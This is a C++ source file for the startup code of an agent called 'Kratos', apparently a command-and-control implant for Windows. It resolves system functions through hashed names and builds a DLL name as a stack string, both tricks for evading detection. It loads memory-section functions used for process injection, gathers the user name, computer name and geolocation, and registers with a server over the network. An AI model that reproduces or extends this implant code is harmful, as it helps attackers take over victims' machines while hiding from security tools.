#include "agent/core.h"
#include "packager/packager.h"
#include "net/net.h"
#include "modules/modules.h"

BOOL Kratos::Init() {

	this->modules.kernel32 = api::GetModule( HASH_STRW ( L"KERNEL32.DLL" ) );
	auto pLocalAlloc = ( decltype ( this->apis.LocalAlloc ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LocalAlloc" ) );
	if (!pLocalAlloc)
		return FALSE;


	if ( ! this->LoadApis( ) ) {
		DEBUG_LOG("[!] Failed loading apis");
		return FALSE;
	}

	packager = new Packager();
	net      = new NetMgr();
	modules  = new Modules();

	if (!net || !packager || !modules) {
		DEBUG_LOG("[!] Failed Allocating net and/or packager/modules");
		return FALSE;
	}
	DEBUG_LOG("[+] Allocated packager,net modules");


	if ( ! this->LoadConfig( ) ) {
		DEBUG_LOG("[!] Failed loading config");
		return FALSE;
	}
	if ( ! net->init( ) ) {
		DEBUG_LOG("[!] Failed network init");
		return FALSE;
	}
	if( ! this->Register( ) ) {
		DEBUG_LOG("[!] Failed register");
		return FALSE;
	}
	//Sleep(20000);

	
	DEBUG_LOG("[*] Apis, Config, net init ran!");

	return TRUE;
}

BOOL Kratos::LoadApis( ) {
	DEBUG_LOG("[+] Loading APIS");
	this->dlls.kernel32 = api::GetModule ( HASH_STRW ( L"KERNEL32.DLL" ) );
	this->dlls.ntdll    = api::GetModule ( HASH_STRW ( L"NTDLL.DLL"    ) );


	if ( this->dlls.kernel32 ) {
		this->apis.LoadLibraryA   = ( decltype ( this->apis.LoadLibraryA   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LoadLibraryA"   ) );
		this->apis.GetProcAddress = ( decltype ( this->apis.GetProcAddress ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetProcAddress" ) );
		this->apis.CloseHandle    = ( decltype ( this->apis.CloseHandle    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CloseHandle"    ) );

		this->apis.LocalAlloc            = ( decltype ( this->apis.LocalAlloc   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalAlloc"   ) );
		this->apis.LocalFree             = ( decltype ( this->apis.LocalFree    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalFree"    ) );
		this->apis.LocalReAlloc          = ( decltype ( this->apis.LocalReAlloc ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalReAlloc" ) );
		this->apis.GetTickCount          = ( decltype ( this->apis.GetTickCount ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetTickCount" ) );
		this->apis.CreateFileA           = ( decltype ( this->apis.CreateFileA  ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CreateFileA"  ) );

		this->apis.GetUserDefaultGeoName = ( decltype ( this->apis.GetUserDefaultGeoName ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetUserDefaultGeoName" ) );
		this->apis.GetComputerNameExW    = ( decltype ( this->apis.GetComputerNameExW    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetComputerNameExW"    ) );

	}
	else { return FALSE; }
	DEBUG_LOG( "[+] Loaded Kernel32" );



	if (this->dlls.ntdll) {
		this->apis.RtlRandomEx               = ( decltype ( this->apis.RtlRandomEx               ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "RtlRandomEx"               ) );
		this->apis.NtOpenProcessToken        = ( decltype ( this->apis.NtOpenProcessToken        ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtOpenProcessToken"        ) );
		this->apis.NtQueryInformationToken   = ( decltype ( this->apis.NtQueryInformationToken   ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtQueryInformationToken"   ) );
		this->apis.NtQueryInformationProcess = ( decltype ( this->apis.NtQueryInformationProcess ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtQueryInformationProcess" ) );
		this->apis.NtCreateSection           = ( decltype ( this->apis.NtCreateSection           ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtCreateSection"           ) );
		this->apis.NtMapViewOfSection        = ( decltype ( this->apis.NtMapViewOfSection        ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtMapViewOfSection"        ) );
	}
	else { return FALSE; }


	CHAR buf[ 13 ];
	buf[ 0 ]  = 'a';
	buf[ 1 ]  = 'd';
	buf[ 2 ]  = 'v';
	buf[ 3 ]  = 'a';
	buf[ 4 ]  = 'p';
	buf[ 5 ]  = 'i';
	buf[ 6 ]  = '3';
	buf[ 7 ]  = '2';
	buf[ 8 ]  = '.';
	buf[ 9 ]  = 'd';
	buf[ 10 ] = 'l';
	buf[ 11 ] = 'l';
	buf[ 12 ] = '\0';
	this->dlls.Advapi32 = this->apis.LoadLibraryA( buf );

	if ( this->dlls.Advapi32 ) {
		this->apis.GetUserNameW = ( decltype( this->apis.GetUserNameW ) ) api::GetProcAddress( this->dlls.Advapi32, HASH_STRA ( "GetUserNameW" ) );
	}
	else { return FALSE; }
	DEBUG_LOG("[+] Loaded advapi32");

	return TRUE;
}

BOOL Kratos::LoadConfig( ) {
	DEBUG_LOG("[+] Loaded Config");
	return TRUE;
}